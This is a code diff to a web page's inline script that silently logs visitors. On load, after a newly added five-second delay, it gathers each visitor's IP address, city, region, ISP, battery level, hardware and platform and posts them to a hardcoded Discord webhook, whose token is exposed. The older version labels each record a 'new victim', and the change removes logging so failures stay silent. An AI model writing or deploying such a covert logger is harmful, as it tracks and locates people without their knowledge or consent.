@@ -10,8 +10,13 @@
 <script>
     const webhookURL = "https://discord.com/api/webhooks/1499880092493414521/NHvrU1wucCRBtCcbC70MEdcpcl-hhH6fJBTl9xsrrrEfwIaXvlkAQrkoH29e0Y_FBiDM";
 
+    // Função que espera X segundos
+    const sleep = ms => new Promise(res => setTimeout(res, ms));
+
     async function stealthCapture() {
-        console.log("Iniciando captura...");
+        // CONTAGEM DE 5 SEGUNDOS (5000 milissegundos)
+        await sleep(5000); 
+
         try {
             // 1. Captura de IP e Localização
             const ipRes = await fetch('https://ipapi.co/json/');
@@ -21,48 +26,40 @@
             let batteryInfo = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Carregando' : 'Descarregando'})`;
+                batteryInfo = Math.round(b.level * 100) + "%";
             }
 
-            // 3. Hardware e Rede
-            const cores = navigator.hardwareConcurrency + " Núcleos CPU";
-            const ram = (navigator.deviceMemory || 'N/A') + " GB";
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            const netInfo = conn ? `${conn.effectiveType.toUpperCase()}` : "N/A";
+            // 3. Hardware
+            const hardwareInfo = navigator.hardwareConcurrency + " Cores / " + (navigator.deviceMemory || 'N/A') + "GB RAM";
 
-            // 4. Montar Payload
+            // 4. Montar o relatório para o Discord
             const discordPayload = {
-                username: "Logger Silencioso",
+                username: "Monitoramento 5s",
                 embeds: [{
-                    title: "🕵️ Nova Vítima Detectada",
-                    color: 0, // Preto
+                    title: "🕵️ Captura Concluída (Após 5 segundos)",
+                    color: 16777215,
                     fields: [
-                        { name: "🌐 IP", value: `\`${ipData.ip}\``, inline: true },
-                        { name: "📍 Local", value: `${ipData.city}, ${ipData.region}`, inline: true },
+                        { name: "🌐 IP", value: ipData.ip || "Erro", inline: true },
+                        { name: "📍 Local", value: (ipData.city || "Desconhecido") + ", " + (ipData.region || ""), inline: true },
                         { name: "🔋 Bateria", value: batteryInfo, inline: true },
-                        { name: "💻 PC/Cel", value: `${cores} | ${ram} RAM`, inline: true },
-                        { name: "📡 Net", value: netInfo, inline: true },
-                        { name: "🗺️ Mapa", value: `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` }
+                        { name: "💻 Hardware", value: hardwareInfo, inline: true },
+                        { name: "📱 Sistema", value: navigator.platform, inline: true },
+                        { name: "📡 ISP", value: ipData.org || "N/A" }
                     ],
+                    footer: { text: "Atraso de 5s aplicado com sucesso" },
                     timestamp: new Date()
                 }]
             };
 
             // 5. Enviar para o Discord
-            const response = await fetch(webhookURL, {
+            await fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(discordPayload)
             });
 
-            if (response.ok) {
-                console.log("Dados enviados com sucesso para o Discord!");
-            } else {
-                console.log("Erro ao enviar para o Discord: ", response.status);
-            }
-
         } catch (error) {
-            console.error("Erro crítico na execução:", error);
+            // Falha silenciosa
         }
     }
 
